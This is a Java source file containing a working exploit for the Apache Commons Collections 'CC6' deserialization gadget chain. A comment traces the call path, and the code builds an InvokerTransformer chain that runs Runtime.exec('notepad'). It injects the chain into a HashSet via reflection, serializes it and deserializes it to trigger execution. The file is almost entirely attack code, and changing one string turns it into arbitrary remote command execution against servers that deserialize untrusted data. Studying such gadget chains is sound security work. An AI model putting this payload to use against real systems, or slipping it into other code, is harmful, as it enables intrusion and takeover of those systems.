package CC6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

/*
HashSet#readObject() -> HashMap#put() -> HashMap#hash() -> TiedMapEntry#hashCode()->
TiedMapEntry#getValue() -> LazyMap#get() -> InvokerTransformer#transform()

HashMap#readObject() -> HashMap#hash() -> TiedMapEntry#hashCode()->
TiedMapEntry#getValue() -> LazyMap#get() -> InvokerTransformer#transform()
*/

public class CC6 {
    public static void main(String[] args) throws Exception{
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"notepad"})});
        HashMap inMap = new HashMap();
        LazyMap map = (LazyMap) LazyMap.decorate(inMap, chain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, 0);

        HashSet set = new HashSet(1);
        set.add(0);

        Field field_map = HashSet.class.getDeclaredField("map");
        field_map.setAccessible(true);
        HashMap hashset_map = (HashMap) field_map.get(set);

        Field field_table = HashMap.class.getDeclaredField("table");
        field_table.setAccessible(true);
        Object[] arr = (Object[]) field_table.get(hashset_map);

        Field field_key =  arr[0].getClass().getDeclaredField("key");
        field_key.setAccessible(true);
        field_key.set(arr[0], tiedMapEntry);

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("serialize"));
        outputStream.writeObject(set);
        outputStream.close();

        ObjectInputStream in = new ObjectInputStream(new FileInputStream("serialize"));
        in.readObject();
    }
}
